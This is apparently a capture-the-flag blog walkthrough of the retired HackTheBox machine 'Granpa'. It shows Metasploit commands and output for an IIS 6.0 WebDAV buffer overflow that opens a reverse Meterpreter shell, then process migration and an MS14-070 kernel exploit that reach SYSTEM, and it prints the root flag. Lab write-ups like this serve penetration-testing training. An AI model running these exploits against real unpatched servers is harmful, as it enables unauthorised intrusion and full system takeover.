---
layout: post
title: Hackthebox Granpa Walkthrough
categories: HackTheBox
---

![placeholder](https://inar1.github.io/public/images/2020-01-12/granpa-badge.png)
#### Retired date: 2017/07/07

# Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has a bunch of vulnerable machines in its own VPN.<br>
For the practice, solve the left boxes in the list of OSCP like boxes and this is a walkthrough of a box "Granpa".<br>
![placeholder](https://inar1.github.io/public/images/general/oscp_like_box.png)

# Solution
### 1. Initial Enumeration

#### TCP Port Scanning:
{% highlight shell %}
root@kali:~# nmap -p- 10.10.10.14 -sV -sC
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-11 15:15 EET
Nmap scan report for 10.10.10.14
Host is up (0.044s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods:
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan:
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   WebDAV type: Unknown
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Server Type: Microsoft-IIS/6.0
|_  Server Date: Sat, 11 Jan 2020 13:21:06 GMT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 113.63 seconds

root@kali:~#
{% endhighlight %}


### 2. Getting User

Nmap revealed only one service, Microsoft IIS version 6 with WebDAV running on the IIS server.<br>
Then, google following keyword.
{% highlight shell %}
webdav iis 6 exploit
{% endhighlight %}

We can find an exploit <a href="https://www.exploit-db.com/exploits/41738">"Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl'"</a>.<br>
Also, searchsploit can find the same vulnerability with the following way.
{% highlight shell %}
root@kali:~# searchsploit iis 6 webdav
------------------------------------------------------------------------------------------ ----------------------------------------
 Exploit Title                                                                            |  Path
                                                                                          | (/usr/share/exploitdb/)
------------------------------------------------------------------------------------------ ----------------------------------------
Microsoft IIS - WebDAV Write Access Code Execution (Metasploit)                           | exploits/windows/remote/16471.rb
Microsoft IIS 5.0 (Windows XP/2000/NT 4.0) - WebDAV 'ntdll.dll' Remote Buffer Overflow (1 | exploits/windows/remote/22365.pl
Microsoft IIS 5.0 (Windows XP/2000/NT 4.0) - WebDAV 'ntdll.dll' Remote Buffer Overflow (2 | exploits/windows/remote/22366.c
Microsoft IIS 5.0 (Windows XP/2000/NT 4.0) - WebDAV 'ntdll.dll' Remote Buffer Overflow (3 | exploits/windows/remote/22367.txt
Microsoft IIS 5.0 (Windows XP/2000/NT 4.0) - WebDAV 'ntdll.dll' Remote Buffer Overflow (4 | exploits/windows/remote/22368.txt
Microsoft IIS 5.0 - WebDAV 'ntdll.dll' Path Overflow (MS03-007) (Metasploit)              | exploits/windows/remote/16470.rb
Microsoft IIS 5.0 - WebDAV Denial of Service                                              | exploits/windows/dos/20664.pl
Microsoft IIS 5.0 - WebDAV PROPFIND / SEARCH Method Denial of Service                     | exploits/windows/dos/22670.c
Microsoft IIS 5.1 - WebDAV HTTP Request Source Code Disclosure                            | exploits/windows/remote/26230.txt
Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow                  | exploits/windows/remote/41738.py
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (1)                               | exploits/windows/remote/8704.txt
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (2)                               | exploits/windows/remote/8806.pl
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (PHP)                             | exploits/windows/remote/8765.php
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (Patch)                           | exploits/windows/remote/8754.patch
------------------------------------------------------------------------------------------ ----------------------------------------
Shellcodes: No Result

root@kali:~# 
{% endhighlight %}

By the following way, we can exploit the vulnerability with Metasploit.<br>
Now we got a shell as user "authority\network service".<br>
However, in this time, it's not possible to achieve "user.txt".
{% highlight shell %}
msf5 > use exploit/windows/iis/iis_webdav_scstoragepathfromurl 
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set rhosts 10.10.10.14
rhosts => 10.10.10.14
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > run

[*] Started reverse TCP handler on 10.10.14.36:4444 
[*] Trying path length 3 to 60 ...
[*] Sending stage (180291 bytes) to 10.10.10.14
[*] Meterpreter session 1 opened (10.10.14.36:4444 -> 10.10.10.14:1031) at 2020-01-11 15:49:29 +0200

meterpreter > shell
[-] Failed to spawn shell with thread impersonation. Retrying without it.
Process 2112 created.
Channel 2 created.
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\Documents and settings>whoami
whoami
nt authority\network service

c:\Documents and settings>
{% endhighlight %}


### 3. Getting Root

Since "nt authority\network service" has less permission than ordinary users, we can not use some common commands here.
{% highlight shell %}
meterpreter > getuid
[-] stdapi_sys_config_getuid: Operation failed: Access is denied.

meterpreter > 
{% endhighlight %}

Before getting SYSTEM shell, we need to achieve another process having better permission.<br>
This time, we cab migrate to the process "notepad.txt".
{% highlight shell %}
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]                                                
 4     0     System                                                          
 272   4     smss.exe                                                        
 324   272   csrss.exe                                                       
 348   272   winlogon.exe                                                    
 396   348   services.exe                                                    
 400   616   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 408   348   lsass.exe                                                       
 616   396   svchost.exe                                                     
 684   396   svchost.exe                                                     
 740   396   svchost.exe                                                     
 768   396   svchost.exe                                                     
 804   396   svchost.exe                                                     
 940   396   spoolsv.exe                                                     
 968   396   msdtc.exe                                                       
 1080  396   cisvc.exe                                                       
 1124  396   svchost.exe                                                     
 1132  1080  cidaemon.exe                                                    
 1184  396   inetinfo.exe                                                    
 1220  396   svchost.exe                                                     
 1332  396   VGAuthService.exe                                               
 1412  396   vmtoolsd.exe                                                    
 1460  396   svchost.exe                                                     
 1600  396   svchost.exe                                                     
 1708  396   alg.exe                                                         
 1816  616   wmiprvse.exe       x86   0                                      \Device\HarddiskVolume1\WINDOWS\system32\wbem\wmiprvse.exe
 1920  396   dllhost.exe                                                     
 2180  1460  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
 2248  616   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
 2328  1080  cidaemon.exe                                                    
 2356  1080  cidaemon.exe                                                    
 2492  616   wmiprvse.exe                                                    
 2872  1816  notepad.exe        x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\notepad.exe
 2972  348   logon.scr                                                       
 3560  1460  w3wp.exe                                                        
 3744  2180  rundll32.exe       x86   0                                      C:\WINDOWS\system32\rundll32.exe

meterpreter > migrate 2872
[*] Migrating from 3744 to 2872...
[*] Migration completed successfully.

meterpreter >
{% endhighlight %}

To find out a vulnerability, we can use the Metasploit module "local_exploit_suggester".
{% highlight shell %}
meterpreter > background
[*] Backgrounding session 1...
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > use post/multi/recon/local_exploit_suggester 
msf5 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf5 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.14 - Collecting local exploits for x86/windows...
[*] 10.10.10.14 - 29 exploit checks are being tried...
[+] 10.10.10.14 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed

msf5 post(multi/recon/local_exploit_suggester) >
{% endhighlight %}

This time, we can use the kernel exploit "MS14-070".
{% highlight shell %}
msf5 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms14_070_tcpip_ioctl 
msf5 exploit(windows/local/ms14_070_tcpip_ioctl) > set session 1
session => 1
msf5 exploit(windows/local/ms14_070_tcpip_ioctl) > run

[*] Started reverse TCP handler on 10.52.0.73:4444 
[*] Storing the shellcode in memory...
[*] Triggering the vulnerability...
[*] Checking privileges after exploitation...
[+] Exploitation successful!
[*] Exploit completed, but no session was created.
msf5 exploit(windows/local/ms14_070_tcpip_ioctl) > sessions 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter >
{% endhighlight %}

root.txt is in the directory "C:\Documents and Settings\Administrator\Desktop".
{% highlight shell %}
meterpreter > pwd
C:\Documents and Settings\Administrator\Desktop

meterpreter > cat root.txt
9359e905a2c35f861f6a57cecf28bb7b

meterpreter > 
{% endhighlight %}
